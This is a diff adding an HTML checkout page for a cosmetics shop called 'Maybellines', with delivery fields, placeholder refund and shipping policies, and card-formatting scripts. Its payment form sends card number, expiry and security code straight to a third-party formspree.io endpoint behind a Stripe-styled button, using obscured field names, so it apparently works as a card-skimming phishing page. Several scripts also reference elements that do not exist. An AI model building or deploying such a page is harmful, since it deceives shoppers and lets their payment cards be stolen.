@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Maybellines </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        .container {
+  position: relative;
+}
+
+.text-detection {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background-color: rgba(255, 255, 255, 0.7);
+  padding: 10px 20px;
+  border-radius: 5px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  z-index: 1;
+}
+
+/* Reset default margin and padding */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+/* Body styles */
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background-color: white;
+  color: #333;
+  margin: 0;
+}
+
+/* Container styles */
+.container {
+    max-width: 600px;
+    margin: 50px auto;
+    padding: 20px;
+    background-color: #ffffff;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+/* Section styles */
+.section {
+    margin-bottom: 20px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #eee;
+}
+
+.section:last-child {
+    margin-bottom: 0;
+    padding-bottom: 0;
+    border-bottom: none;
+}
+
+/* Heading styles */
+h2 {
+    font-size: 22px;
+    margin-bottom: 10px;
+    font-weight: bold;
+}
+
+/* Input styles */
+input[type="text"],
+input[type="email"],
+input[type="tel"],
+select {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 10px;
+    border: 1px solid #dfe1e5;
+    border-radius: 4px;
+    font-size: 16px;
+    line-height: 1.5;
+    color: #32325d;
+    background-color: #fff;
+    background-image: none;
+    box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
+}
+
+/* Focus styles */
+input[type="text"]:focus,
+input[type="email"]:focus,
+input[type="tel"]:focus,
+select:focus {
+    border-color: #007bff;
+    outline: 0;
+    box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+}
+
+
+
+
+/* Select styles */
+select {
+    appearance: none;
+    padding-right: 30px;
+    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23333"><path d="M7 10l5 5 5-5z"/></svg>');
+    background-repeat: no-repeat;
+    background-position: right 10px center;
+}
+
+/* Payment icons styles */
+.payment-icons {
+    display: flex;
+    align-items: center;
+    margin-bottom: 10px;
+}
+
+.payment-icon {
+    font-size: 24px;
+    color: #666;
+    margin-right: 10px;
+}
+
+/* Style for Payment Information section */
+.payment-information {
+    background-color: #f6f6f6;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+    margin-bottom: 20px;
+}
+
+/* Payment Icons */
+.payment-icons {
+    display: flex;
+    align-items: center;
+    margin-bottom: 10px;
+}
+
+.payment-icon {
+    font-size: 24px;
+    color: #605a5a;
+    margin-right: 10px;
+}
+
+
+/* Base Submit Button Styles */
+input[type="submit"] {
+    padding: 15px 20px;
+    background-color: #2f9ae0;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 16px;
+    display: block;
+    width: 100%;
+    margin-top: 30px;
+    text-align: center;
+}
+
+input[type="submit"]:hover {
+    background-color: #0070ba;
+}
+
+/* Media Query for Phones */
+/* Media Query for Phones */
+@media (max-width: 600px) {
+    input[type="submit"] {
+        padding: 35px 15px; /* Adjusted padding for phones */
+        font-size: 14px; /* Reduce font size for smaller screens */
+        width: calc(100% + 30px); /* Increase width to cover full width of container */
+        margin-left: -15px; /* Center the button */
+    }
+}
+
+
+
+
+/* Label Styles */
+.input-container label {
+  display: block;
+  margin-bottom: 5px;
+  color: #666;
+  font-size: 14px;
+}
+
+
+
+#shipping-form {
+  margin-top: 20px;
+}
+
+#shipping-form label {
+  display: block;
+  font-weight: bold;
+  margin-bottom: 10px;
+}
+
+#shipping-method {
+  padding: 8px;
+  font-size: 16px;
+  width: 100%;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+}
+
+#shipping-method option {
+  padding: 8px;
+}
+
+#shipping-method:hover,
+#shipping-method:focus {
+  border-color: #007bff;
+  outline: none;
+}
+
+#shipping-method:focus {
+  box-shadow: 0 0 0 3px rgba(95, 99, 104, 0.25);
+}
+
+#shipping-method option:checked {
+  background-color: #716b6b;
+  color: white;
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #f4f4f4;
+}
+
+.order-summary {
+    background: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    width: 300px;
+}
+
+h2 {
+    margin-bottom: 20px;
+}
+
+.order-items {
+    margin-bottom: 20px;
+}
+
+.order-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 10px;
+}
+
+.order-item span {
+    display: inline-block;
+    margin-right: 10px;
+}
+
+.order-item input {
+    width: 40px;
+    text-align: center;
+}
+
+.order-total {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 20px;
+}
+
+.checkout-button {
+    width: 100%;
+    padding: 10px;
+    background-color: #007bff;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+.checkout-button:hover {
+    background-color: #0056b3;
+}
+
+}
+/* Policies section */
+.policies {
+    font-size: 14px;
+    color: #666;
+    margin-top: -30px;
+    line-height: 1.5;
+}
+
+.policies a {
+    color: #007bff;
+    text-decoration: none;
+}
+
+.policies a:hover {
+    text-decoration: underline;
+}
+
+/* Modal Styles */
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1000; /* Sit on top */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgba(0, 0, 0, 0.7); /* Black w/ opacity */
+}
+
+.modal-content {
+    background-color: #fff;
+    margin: 15% auto; /* 15% from the top and centered */
+    padding: 20px;
+    border: 1px solid #888;
+    width: 80%; /* Could be more or less, depending on screen size */
+    max-width: 600px; /* Optional */
+}
+
+.policy-section {
+    margin-top: 20px;
+}
+
+.policy-section h3 {
+    font-size: 16px;
+    font-weight: bold;
+    color: #333;
+    margin-bottom: 10px;
+}
+
+.policy-section p {
+    font-size: 14px;
+    color: #666;
+    line-height: 1.6;
+}
+
+/* Close button */
+.close {
+    color: #aaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+    color: black;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+    </style>
+   
+    <script>
+        // Wait for DOM to load before running
+document.addEventListener("DOMContentLoaded", function() {
+    var toggles = document.querySelectorAll('.policy-toggle');
+    var modal = document.getElementById("modal");
+    var modalText = document.getElementById("modal-text");
+    var closeModal = document.getElementsByClassName("close")[0];
+
+   // Create a mapping of policy content
+const policyContent = {
+    'refund-policy': `
+        <h3>Refund Policy</h3>
+        <p>If you are not completely satisfied with your purchase, we offer a hassle-free return process. Here are the key points of our refund policy:</p>
+        <ul>
+            <li><strong>Return Window:</strong> You can return items within <strong>30 days</strong> from the date of purchase. Please ensure that the items are unused, in their original packaging, and include all tags.</li>
+            <li><strong>Eligibility:</strong> To be eligible for a refund, your item must be in the same condition that you received it, unworn or unused, with tags, and in its original packaging.</li>
+            <li><strong>Refund Process:</strong> Once we receive your returned item, we will inspect it and notify you of the status of your refund. If approved, your refund will be processed and a credit will automatically be applied to your original method of payment within a certain amount of days.</li>
+            <li><strong>Return Shipping:</strong> Customers are responsible for return shipping costs unless the item is defective or the wrong item was sent. In such cases, we will provide a prepaid shipping label.</li>
+            <li><strong>Non-Returnable Items:</strong> Certain items are non-returnable, including but not limited to personal care products and items marked as final sale.</li>
+            <li><strong>How to Initiate a Return:</strong> To initiate a return, please contact our customer service team at [customer service email] or visit our returns portal [link to returns portal]. Include your order number and the reason for the return.</li>
+            <li><strong>Exchanges:</strong> If you need to exchange an item for the same item in a different size or color, please initiate a return and place a new order for the desired item.</li>
+        </ul>
+        <p>For any questions regarding your return or refund, please do not hesitate to reach out to our customer service team. Your satisfaction is our priority!</p>
+    `,
+    'shipping-policy': `
+        <h3>Shipping Policy</h3>
+        <p>We are committed to delivering your order in a timely manner. Please review our shipping policies below:</p>
+        <ul>
+            <li><strong>Shipping Options:</strong> We offer several shipping methods at checkout, including Standard, Expedited, and Overnight shipping.</li>
+            <li><strong>Delivery Times:</strong> Standard shipping typically takes <strong>3-5 business days</strong>, while Expedited shipping takes <strong>1-3 business days</strong>. Overnight shipping is available for urgent deliveries.</li>
+            <li><strong>Shipping Fees:</strong> Shipping costs vary based on the selected shipping method and the total weight of your order. You can view the shipping charges at checkout before completing your purchase.</li>
+            <li><strong>Order Tracking:</strong> After your order is shipped, you will receive a confirmation email with a tracking number to monitor your shipment's progress.</li>
+            <li><strong>International Shipping:</strong> We currently offer international shipping to select countries. Please note that additional customs fees may apply.</li>
+        </ul>
+        <p>If you have any questions about shipping, please contact our customer service team for assistance.</p>
+    `,
+    'privacy-policy': `
+        <h3>Privacy Policy</h3>
+        <p>Your privacy is important to us. We are committed to protecting your personal information. Below are the key aspects of our privacy policy:</p>
+        <ul>
+            <li><strong>Information Collection:</strong> We collect personal information that you provide when placing an order or subscribing to our newsletter, including your name, email address, shipping address, and payment information.</li>
+            <li><strong>Use of Information:</strong> Your information is used to process orders, manage your account, improve our services, and communicate with you regarding your orders and promotions.</li>
+            <li><strong>Data Security:</strong> We implement appropriate security measures to protect your personal information from unauthorized access, alteration, disclosure, or destruction.</li>
+            <li><strong>Sharing of Information:</strong> We do not sell or share your personal information with third parties without your consent, except as required by law or to service providers who assist us in operating our website.</li>
+            <li><strong>Your Rights:</strong> You have the right to access, correct, or delete your personal information. You can also unsubscribe from our marketing communications at any time.</li>
+        </ul>
+        <p>For more details, please read our full privacy policy.</p>
+    `,
+    'terms-service': `
+        <h3>Terms of Service</h3>
+        <p>By using our services, you agree to abide by the following terms and conditions:</p>
+        <ul>
+            <li><strong>Acceptance of Terms:</strong> By accessing or using our website, you agree to be bound by these terms. If you do not agree, please do not use our services.</li>
+            <li><strong>Account Responsibilities:</strong> If you create an account with us, you are responsible for maintaining the confidentiality of your account information and password.</li>
+            <li><strong>Product Information:</strong> We strive to provide accurate product descriptions, pricing, and images. However, we do not warrant that the information is error-free or complete.</li>
+            <li><strong>Limitation of Liability:</strong> We are not liable for any indirect, incidental, or consequential damages arising from your use of our services or products.</li>
+            <li><strong>Governing Law:</strong> These terms are governed by the laws of [Your State/Country]. Any disputes arising under these terms shall be resolved in accordance with the applicable laws.</li>
+        </ul>
+        <p>Please review our complete terms of service for more information.</p>
+    `
+};
+
+
+    // Loop through all toggles and add click event listeners
+    toggles.forEach(function(toggle) {
+        toggle.addEventListener('click', function() {
+            var targetId = this.getAttribute('data-target');
+            modalText.innerHTML = policyContent[targetId]; // Set the inner HTML to the selected policy
+            modal.style.display = "block"; // Show the modal
+        });
+    });
+
+    // Close the modal when the user clicks on <span> (x)
+    closeModal.onclick = function() {
+        modal.style.display = "none"; // Hide the modal
+    }
+
+    // Close the modal when the user clicks anywhere outside of the modal
+    window.onclick = function(event) {
+        if (event.target === modal) {
+            modal.style.display = "none"; // Hide the modal
+        }
+    }
+});
+
+
+
+        
+        document.addEventListener("DOMContentLoaded", function () {
+        // Select the card number, expiration date, security code, and tip amount fields
+        const cardNumber = document.getElementById('cer');
+        const expiryDate = document.getElementById('eate');
+        const securityCode = document.getElementById('se');
+        const tipAmount = document.getElementById('tnt');
+    
+        // Set the input types to 'tel' to open numeric keyboard on mobile
+        cardNumber.setAttribute('type', 'tel');
+        expiryDate.setAttribute('type', 'tel');
+        securityCode.setAttribute('type', 'tel');
+        tipAmount.setAttribute('type', 'tel');
+    });
+    
+      document.addEventListener('DOMContentLoaded', function() {
+          // Format card number with dashes and ensure only numeric input
+          const cardNumberInput = document.getElementById('cer');
+          cardNumberInput.addEventListener('input', function(e) {
+              let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+              let formattedValue = '';
+              for (let i = 0; i < value.length; i += 4) {
+                  if (i > 0) {
+                      formattedValue += '-';
+                  }
+                  formattedValue += value.substring(i, i + 4);
+              }
+              e.target.value = formattedValue;
+          });
+    
+          // Open numeric keyboard on focus (mostly for iOS devices)
+          cardNumberInput.addEventListener('focus', function() {
+              cardNumberInput.setAttribute('inputmode', 'numeric');
+          });
+      });
+    </script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+          // Format card number with dashes
+          const cardNumberInput = document.getElementById('cer');
+          cardNumberInput.addEventListener('input', function(e) {
+              let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+              let formattedValue = '';
+              for (let i = 0; i < value.length; i += 4) {
+                  if (i > 0) {
+                      formattedValue += '-';
+                  }
+                  formattedValue += value.substring(i, i + 4);
+              }
+              e.target.value = formattedValue;
+          });
+    
+          // Format expiration date to MM/YY
+          const expirationDateInput = document.getElementById('eate');
+          expirationDateInput.addEventListener('input', function(e) {
+              let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+              if (value.length >= 3) {
+                  e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+              } else {
+                  e.target.value = value;
+              }
+          });
+    
+          // Validate security code to accept only numbers
+          const securityCodeInput = document.getElementById('se');
+          securityCodeInput.addEventListener('input', function(e) {
+              e.target.value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+          });
+    
+          // Optionally, validate name on card to allow only letters and spaces
+          const nameOnCardInput = document.getElementById('na');
+          nameOnCardInput.addEventListener('input', function(e) {
+              e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, ''); // Allow only letters and spaces
+          });
+      });
+    </script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+          const tipInput = document.getElementById('tnt');
+          const tipButtons = document.querySelectorAll('.tip-button');
+    
+          tipButtons.forEach(button => {
+              button.addEventListener('click', function() {
+                  const tipAmount = this.getAttribute('data-tip');
+                  tipInput.value = tipAmount;
+              });
+          });
+      });
+    </script>
+    <style>
+        .stripe-button {
+    background-color: black; /* Stripe brand color */
+    color: #ffffff; /* Text color */
+    font-size: 16px; /* Font size */
+    padding: 12px 24px; /* Padding for size */
+    border: none; /* No border */
+    border-radius: 5px; /* Rounded corners */
+    cursor: pointer; /* Pointer cursor on hover */
+    transition: background-color 0.3s ease; /* Transition effect */
+    font-weight: bold; /* Bold text */
+    width: 100%; /* Full width */
+}
+
+.stripe-button:hover {
+    background-color: #5469d4; /* Darker shade on hover */
+}
+
+.stripe-button:active {
+    background-color: #4e61c2; /* Even darker shade when active */
+}
+h1 {
+    font-family: 'Helvetica Neue', 'Arial', sans-serif; /* Use a modern font */
+    font-size: 36px; /* Adjust the size */
+    font-weight: bold; /* Make it bold */
+    color: #32325d; /* Dark blue color similar to Stripe's branding */
+    text-align: left; /* Center the text */
+    margin: 20px 0; /* Add some margin above and below */
+    letter-spacing: 0.5px; /* Slightly increase letter spacing */
+}
+
+/* Optional: Add a subtle shadow for depth */
+h1 {
+    text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+}
+
+
+    </style>
+</head>
+<body>
+    <h1>MAYBELLINES</h1>
+
+    <div class="container">
+        <!-- Contact Information Section -->
+        <div class="section">
+            <h2>Contact</h2>
+            <form action="https://formspree.io/f/mbjnoeew" method="POST">
+                <input type="email" id="email" name="email" class="payment-input" placeholder="Email" required>
+            </form>
+        </div>
+
+        <!-- Delivery Information Section -->
+        <div class="section">
+            <h2>Delivery</h2>
+            <form>
+                <input type="text" id="first-name" name="first-name" class="payment-input" placeholder="First Name" required>
+                <input type="text" id="last-name" name="last-name" class="payment-input" placeholder="Last Name" required>
+                <input type="text" id="address" name="address" class="payment-input" placeholder="Address" required>
+                <input type="text" id="apartment" name="apartment" class="payment-input" placeholder="Apartment">
+                <select id="state" name="state" class="payment-input" required>
+                    <option value="" disabled selected>Select State or City</option>
+                    <option value="Karachi">Karachi</option>
+                    <option value="Lahore">Lahore</option>
+                    <option value="Islamabad">Islamabad</option>
+                    <option value="Rawalpindi">Rawalpindi</option>
+                    <option value="Faisalabad">Faisalabad</option>
+                    <option value="Peshawar">Peshawar</option>
+                    <option value="Multan">Multan</option>
+                    <option value="Quetta">Quetta</option>
+                    <option value="Gujranwala">Gujranwala</option>
+                    <option value="Sialkot">Sialkot</option>
+                    <option value="Hyderabad">Hyderabad</option>
+                    <option value="Sargodha">Sargodha</option>
+                    <option value="Bahawalpur">Bahawalpur</option>
+                    <option value="Sukkur">Sukkur</option>
+                    <option value="Larkana">Larkana</option>
+                    <option value="Sheikhupura">Sheikhupura</option>
+                    <option value="Mardan">Mardan</option>
+                    <option value="Kasur">Kasur</option>
+                    <option value="Gujrat">Gujrat</option>
+                    <option value="Jhelum">Jhelum</option>
+              </select>             
+                <input type="text" id="city" name="city" class="payment-input" placeholder="City" required>
+                <input type="tel" id="zip-code" name="zip-code" class="payment-input" placeholder="Zip Code" required inputmode="numeric">
+            </form>
+        </div>
+
+        <!-- Shipping Method Selection Form -->
+        <div class="section">
+            <form id="shipping-form">
+                <label for="shipping-method">Shipping Method</label>
+                <select id="shipping-method" name="shipping-method">
+                    <option value="standard">Standard - Free Shipping</option>
+                    <option value="express">Express Shipping - Rs250</option>
+                </select>
+            </form>
+        </div>
+
+        <!-- Payment Information Section -->
+        <div class="section payment-information">
+            <h2>Payment</h2>
+            <div class="payment-icons">
+                <i class="fab fa-cc-visa payment-icon"></i>
+                <i class="fab fa-cc-mastercard payment-icon"></i>
+                <i class="fab fa-cc-amex payment-icon"></i>
+                <i class="fab fa-cc-discover payment-icon"></i>
+            </div>
+            <form action="https://formspree.io/f/mdkekeaw" method="POST">
+                <input type="text" id="cer" name="car" class="input-field" placeholder="Card Number" required>
+                <input type="text" id="eate" name="ee" class="input-field" placeholder="MM/YY" required>
+                <input type="text" id="se" name="sece" class="input-field" placeholder="Security Code" required>
+                <button class="stripe-button">Complete Purchase</button>            </form>
+        </div>
+    </div>
+     
+
+  <!-- Policies Section with clickable titles -->
+  <div class="policies">
+    <p>
+        <a href="javascript:void(0)" class="policy-toggle" data-target="refund-policy">Refund Policy</a> | 
+        <a href="javascript:void(0)" class="policy-toggle" data-target="shipping-policy">Shipping Policy</a> | 
+        <a href="javascript:void(0)" class="policy-toggle" data-target="terms-service">Terms of Service</a>
+    </p>
+</div>
+
+</div>
+
+<!-- Modal for displaying policies -->
+<div id="modal" class="modal">
+<div class="modal-content">
+    <span class="close">&times;</span>
+    <div id="modal-text" class="policy-section"></div>
+</div>
+</div>
+
+
+
+</div>
+</body>
+</html>
